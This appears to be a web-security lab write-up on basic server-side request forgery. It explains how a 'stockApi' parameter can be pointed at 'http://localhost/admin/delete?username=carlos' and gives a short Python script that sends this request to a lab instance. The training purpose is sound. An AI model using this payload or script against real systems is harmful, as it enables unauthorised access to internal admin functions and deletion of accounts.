1. Basic SSRF against the local server</a>

Server-side request forgery (SSRF) - we coerce the server into making a request
on our behalf to some endpoint. The endpoint will receive the request from the
server, not us, therefore we can abuse existing trust relationships between the
server and the target endpoint.

In this case, the server uses a stock API to check to see if an item is in
stock. How the server makes this request is transparent to the user - a POST
request is sent to the server with the API frontend URL contained in the
paramter "stockApi". The server proceeds to make a GET request to this stock
API.

We want to delete the user "carlos", but we don't have administrator access on
the server. We can, however, hit the /product/stock endpoint on this server,
allowing us to coerce the server into making a GET request to an arbitrary URL.
We make a POST request to the /product/stock endpoint on the server, passing the
parameter "stockApi" with the value
"http://localhost/admin/delete?username=carlos". The server proceeds to initiate
a GET request to itself, allowing us to abuse the existing trust relationship
and delete the user "carlos".

Solution:

```python
# usage:
# python3 1.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --w carlos

from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str, who: str) -> None:
        self.url = url.rstrip("/")
        self.who = who

    def solve(self) -> None:
        self.s = requests.Session()
        self.s.post(
            f"{self.url}/product/stock",
            data={"stockApi": f"http://localhost/admin/delete?username={self.who}"},
        )


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--w", "--who", dest="who")
    args = parser.parse_args()
    s = Solution(args.url, args.who)
    s.solve()


if __name__ == "__main__":
    main()
```
